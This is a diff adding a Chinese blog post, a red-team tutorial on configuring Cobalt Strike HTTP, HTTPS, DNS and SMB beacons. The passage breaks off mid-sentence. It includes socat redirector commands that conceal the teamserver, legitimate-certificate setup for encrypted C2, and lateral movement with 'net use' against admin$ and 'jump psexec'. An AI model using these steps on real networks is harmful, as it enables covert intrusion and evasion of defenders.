@@ -1,0 +1,335 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于CobaltStrike各种协议beacon的使用总结 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="关于CobaltStrike各种协议beacon的使用总结"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>关于CobaltStrike各种协议beacon的使用总结</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2020/09/02/关于CobaltStrike各种协议beacon的使用总结/" rel="bookmark">
+        <time class="entry-date published" datetime="2020-09-02T12:15:47.000Z">
+          2020-09-02
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​        在之前的学习中我们了解了关于CobaltStrike beacon运行的流程，以及流量的修改，今天我们一起来学习一下CobaltStrike自带的各种beacon的使用。</p>
+<h3 id="http-beacon"><a href="#http-beacon" class="headerlink" title="http beacon"></a>http beacon</h3><p>​        http beacon 使用get方式去获取服务端下发的任务，同时使用post方式向服务端获取数据。关于使用ip上线我相信大家都已经非常熟悉了，所以我主要讲一下关于域名上线需要注意的问题。</p>
+<span id="more"></span>
+
+<h4 id="设置域名上线"><a href="#设置域名上线" class="headerlink" title="设置域名上线"></a>设置域名上线</h4><p>​         当我们打开cobaltstrike 4.0时，添加一个http listener，通常界面如下</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114217908.png" alt="image-20200903114217908"></p>
+<p>​        这里主要注意一下http hosts设置这里，我在参考手册上看到这里可以设置多个地址作为回连的地址，我以为可以同时设置几个服务器ip，当执行后可以同时在这几个服务器上获得beacon，在网上查了很多资料也没有发现关于这里配置的一个解释。最后经过实践发现，这里是可以配置多个域名并且这些域名指向的是我们同一个团队服务器，这样才能正常上线。配置好以后我们使用wireshark看看。</p>
+<p>​        我们可以看到，当执行exe通过stager下载stage时，使用的http host（stager）的地址</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114500405.png" alt="image-20200903114500405"></p>
+<p>​        心跳包则使用了我们在http hosts中配置的地址</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903114639258.png" alt="image-20200903114639258"></p>
+<p>​        并且这些请求的地址会根据我们在http hosts中的设置自动切换不同的地址</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903115125593.png" alt="image-20200903115125593"></p>
+<p>​        上面我们演示了如何使用多个域名上线的方法，因为我这里的域名加了cludefalre的cdn，配置多个子域名解析到同一个服务器，配置如下</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903120016032.png" alt="image-20200903120016032"></p>
+<p>​        还有一个小坑就是cludefalre针对http协议只允许几个端口，如果使用其他的端口则会导致上线失败</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903120117553.png" alt="image-20200903120117553"></p>
+<h4 id="设置重定向"><a href="#设置重定向" class="headerlink" title="设置重定向"></a>设置重定向</h4><p>​            在linux下我们可以使用socat来做重定向，命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:xxx.xxx.xxx.xx:8080</span><br></pre></td></tr></table></figure>
+
+<p>​        通过上面的设置，当我们访问本地的80端口时，实际上会把流量转发到远程主机的8080端口</p>
+<p>​        首先我再远程vps上开启了8888端口</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141235269.png" alt="image-20200903141235269"></p>
+<p>​        在本地的kali上做了一个重定向，将kali的88端口的流量重定向到远程主机的8888端口</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141204409.png" alt="image-20200903141204409"></p>
+<p>​        最后，当我们访问本地的88端口实际上访问的是远程地址的8888端口</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903141331725.png" alt="image-20200903141331725"></p>
+<p>​        通过上面的学习我们了解了关于socat做重定向的使用，现在我们再来看看如何在cobaltstrike中使用重定向。</p>
+<p>​        首先我们在自己已有的一个服务器上开启重定向，将来自8080的流量转发到我们的teamserver服务器的8080端口</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903161651534.png" alt="image-20200903161651534"></p>
+<p>​        然后我们再cobaltstrkie中进行配置，这里的配置无论是http hosts 还是 http host(stager)我们都配置为转发的那台服务器的地址或者对应的域名，而不是我们的teamserver的，这里需要注意。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903161845634.png" alt="image-20200903161845634"></p>
+<p>​        配置好listener以后，我们生成exe执行，使用wireshark进行抓包，我们可以看到，无论是下载stage的请求还是心跳包，请求的都是我们配置的重定向服务器的地址，而不是我们真正的teamserver的地址，这样就可以保护我们的teamserver服务器地址不会泄露。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162253680.png" alt="image-20200903162253680"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162523973.png" alt="image-20200903162523973"></p>
+<p>​    我们可以在多个服务器上执行转发操作，来保护我们teamserver的安全，只要在http hosts中进行添加即可。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903162836545.png" alt="image-20200903162836545"></p>
+<p>​    在设置完listener以后，可以通过向重定向服务器的8080端口发起请求，查看cobaltstrike web log的方法测试重定向是否设置成功。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163205116.png" alt="image-20200903163205116"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163221050.png" alt="image-20200903163221050"></p>
+<p>​        还需要注意的是，我们在设置转发的时候可以通过给远程地址使用域名来进行重定向，但是需要注意的是，如果使用的这个域名是有cdn的，则会转发失败。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903163427110.png" alt="image-20200903163427110"></p>
+<p>​    实际上可以用来做重定向的方法还有几种，不过这个不是我们今天的重点，以后我会讲关于其他重定向方法的使用。</p>
+<h3 id="https-beacon"><a href="#https-beacon" class="headerlink" title="https beacon"></a>https beacon</h3><p>​        使用https会对传输过程中的通讯流量进行加密传输，其余的设置和http beacon相同。</p>
+<h4 id="配置合法证书上线"><a href="#配置合法证书上线" class="headerlink" title="配置合法证书上线"></a>配置合法证书上线</h4><p>​        要配置合法的证书上线，首先我们得拥有一个自己的域名，购买域名后，可以到<a target="_blank" rel="noopener" href="https://freessl.cn/">freessl</a>为我们购买的域名申请证书，选择浏览器生成</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175452968.png" alt="image-20200903175452968"></p>
+<p>​        点击生成后会下载一个压缩包，并且会到如下界面，需要在自己的域名解析那配置一个解析记录。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175552101.png" alt="image-20200903175552101"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903175731164.png" alt="image-20200903175731164"></p>
+<p>​        配置完成后，点击“配置完成，检测一下”功能进行检测。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190309403.png" alt="image-20200903190309403"></p>
+<p>​        检测通过后，点击验证</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190642071.png" alt="image-20200903190642071"></p>
+<p>​        验证通过后，会来到如下界面</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190904144.png" alt="image-20200903190904144"></p>
+<p>​        下载以后有两个文件</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903190958373.png" alt="image-20200903190958373"></p>
+<p>​        将这两个文件传到我们服务器cobaltstrike所在的目录下，执行下面的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in full_chain.pem -inkey private.key -out www.xxx.com -name www.xxx.com -passout pass:xxxxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903191955435.png" alt="image-20200903191955435"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass sectest666 -destkeypass xxxx -destkeystore test666.store -srckeystore www.xxx.com -srcstoretype PKCS12 -srcstorepass sectest666 -alias www.xxx.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192159669.png" alt="image-20200903192159669"></p>
+<p>​        生成好以后，将证书设置到我们的profile文件中，找到 https-certificate下的内容，将密码和store文件名进行替换，我以msu_edu.profile文件为例，配置如下</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192707348.png" alt="image-20200903192707348"></p>
+<p>​        将profile文件设置好以后，使用./c2lint msu_edu.profile 进行验证</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903192849282.png" alt="image-20200903192849282"></p>
+<p>​        最后，我们还需要在teamserver这个文件中修改keyStore的文件名和keyStorePassword的值。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903193351419.png" alt="image-20200903193351419"></p>
+<p>​        开启服务端后，创建一个https beacon,其中https  hosts和https host (stager)都配置为我们申请证书的域名</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094728657.png" alt="image-20200904094728657"></p>
+<p>​        生成一个web drivery（s），这里<strong>host需要使用我们申请的域名的地址</strong>，否则是上不了线的</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200903193932046.png" alt="image-20200903193932046"></p>
+<p>​        生成的链接我们访问一下，可以看到证书是没有问题的</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094828902.png" alt="image-20200904094828902"></p>
+<p>​        执行powershell后即可上线</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904094924959.png" alt="image-20200904094924959"></p>
+<p>​        因为这里我们使用的是https协议，所以使用wireshark是看不到请求的内容的。</p>
+<h3 id="DNS-beacon"><a href="#DNS-beacon" class="headerlink" title="DNS beacon"></a>DNS beacon</h3><p>​        在一些隔离比较好的网络里，一般http或者https协议可能是不出网的，但是DNS协议是出网的，因此可以使用DNS协议来帮助我们来传输数据。</p>
+<h4 id="配置DNS-解析"><a href="#配置DNS-解析" class="headerlink" title="配置DNS 解析"></a>配置DNS 解析</h4><p>​        首先我们需要在DNS上设置一个A记录,将我们申请的一个域名的子域名指向我们的teamserver服务器的ip地址。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904101728925.png" alt="image-20200904101728925"></p>
+<p>​        之后需要添加一个NS记录，记录名可以写上dns，记录值写入test666.xxx.com</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904102228588.png" alt="image-20200904102228588"></p>
+<p>​        设置好以后，当我们去请求xxx.dns.xxx.com时，首先dns首先会解析到xxx.com，再发现dns.xxx.com是test666.xxx.com来解析，然后就可以找到test666.xxx.com对应的ip地址来进行通信。</p>
+<p>​        然后我们在cobaltstrkie中开启一个dns listener,这里DNS Hosts和DNS Host(stager)都需要配置为dns.xxx.com</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904104939022.png" alt="image-20200904104939022"></p>
+<p>​        开启监听后，我们再使用nslookup进行测试,但是我们看到这个地址是8.8.8.8，这个是因为我们在profile文件中配置的问题，可以在文件中的dns_idle这个参数进行配置，cobaltstrike会通过返回这个地址告诉客户端没有安排任务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup dns.xxx.com test666.xxx.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904105137130.png" alt="image-20200904105137130"></p>
+<p>​        配置好以后我们首先生成一个executable的shell，这种shell有个特点，之前的文章中我们分析过，就是他会分阶段请求，因此生成的文件stager文件比较小，实际在执行阶段会去下载相对来说比较大的stage文件，我们将生成的shell执行后抓包，可以看到客户端向我们的域名发起解析大量的解析请求。而且在等待了一小段时间后发现还是没有上线，因为要下载的stage文件比较大，大概200多k左右，使用dns解析去获取这个文件会非常慢，这也是为什么很多人测试dns上线以为失败了的原因。<img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904110829625.png" alt="image-20200904110829625"></p>
+<p>​        因此，我们在使用DNS上线cobaltstrike的时候就不要使用分阶段执行的方式了，直接生成一个stageless的shell就好了。当使用stageless的shell后，执行后发起的请求非常少，并且也可以马上上线。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904111354460.png" alt="image-20200904111354460"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904111427752.png" alt="image-20200904111427752"></p>
+<p>​        可以看到上线以后是一个黑框，这个就是DNS beacon上线后的样子，这个时候如果我们去执行命令会执行失败，这个时候我们需要使用一个checkin命令，让dns beacon回连我们的teamserver，理论上讲设置了checkin以后就会和我们其他隧道上线后的样子一样，但我设置以后还是还是迟迟没有上线，这里是因为数据传输过慢而导致的，我们可以再执行mode dns-txt来加快数据传输的速度，当我们执行完这个命令后再看下数据包</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904112605904.png" alt="image-20200904112605904"></p>
+<p>​        可以看到数据传输加快了，并且我们可以命令也可以正常执行。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904112632294.png" alt="image-20200904112632294"></p>
+<p>​        这里对DNS beacon做一个小小的总结，首先，生成的shell注意要生成stagless的shell，否则会迟迟上不了线。还有就是上线后需要去执行checkin和mode dns-txt命令，否则基本也执行不了命令。</p>
+<p>​        最后其实关于dns beacon的配置也可以再profile文件中进行配置。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904113553210.png" alt="image-20200904113553210"></p>
+<h4 id="DNS-beacon-配合重定向上线"><a href="#DNS-beacon-配合重定向上线" class="headerlink" title="DNS beacon 配合重定向上线"></a>DNS beacon 配合重定向上线</h4><p>​        首先我们还是再DNS上进行一些配置，不过这次配置，解析的地址设置的不是我们的teamserver的地址，而是做重定向的那台主机的ip地址。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904114435877.png" alt="image-20200904114435877"></p>
+<p>​        然后我们用nslookup来进行检查，看是否能正常解析到我们的的重定向主机</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904115655015.png" alt="image-20200904115655015"></p>
+<p>​        测试正常以后，我们再重定向主机上用socat做一个转发，将来自53的流量转发到我们teamserver的53，这里需要注意的是转发需要设置udp而不是ftp。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat UDP4-LISTEN:53,fork UDP:XXX.XXX.XXX.XXX:53</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904133845024.png" alt="image-20200904133845024"></p>
+<p>​        使用cobaltstrike创建一个dns listener,配置和之前一样</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904133934172.png" alt="image-20200904133934172"></p>
+<p>​        配置好以后，我们生成一个stageless的shell，执行后即可上线</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904134414570.png" alt="image-20200904134414570"></p>
+<h3 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h3><p>​        在内网横向渗透时，经常会遇到内网主机无法和我们搭建在外网的teamserver进行通信，这时，可以使用smb beacon来上线内网的断网主机。</p>
+<p>​        首先创建一个smb listener，因为我们在使用smb beacon时实际是使用了命名管道的技术，所以还要去设置管道名，在下方对应的ntsvcs</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904134955291.png" alt="image-20200904134955291"></p>
+<p>​        配置好以后，假如我们现在已经知道了某个内网主机的密码,但是这台内网主机无法通外网，就可以借助smb beacon来上线内网主机。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.73\admin$ /user:&quot;dbadmin&quot; &quot;xxxxx&quot;    //首先和内网主机建立ipc连接</span><br><span class="line">jump psexec 192.168.3.73 test666  //test666为smb listener的名字</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140424681.png" alt="image-20200904140424681"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140435915.png" alt="image-20200904140435915"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140450106.png" alt="image-20200904140450106"></p>
+<p>​        我们在上线的断网机上执行命令，抓包可以看到是边界主机和内网断网主机通过ntsvcs这个命令smb命名管道进行通信的。还要说明的是上线的内网主机默认心跳会一直增加，这个不用管，需要使用的时候去执行就行了。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140731323.png" alt="image-20200904140731323"></p>
+<p>​        同样我们也可以在GUI界面上使用pth来上线断网机，</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904142513359.png" alt="image-20200904142513359"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904142457361.png" alt="image-20200904142457361"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143038298.png" alt="image-20200904143038298"></p>
+<p>​        psexec设置的时候，listener设置我们建立的smb beacon的listener。执行结果如下</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143131436.png" alt="image-20200904143131436"></p>
+<p>​         通过上面的执行过程我们可以看到，cobaltstrike首先伪造了令牌，再通过伪造的令牌执行smb beacon。所以上面那个过程我们完全可以通过命令来执行</p>
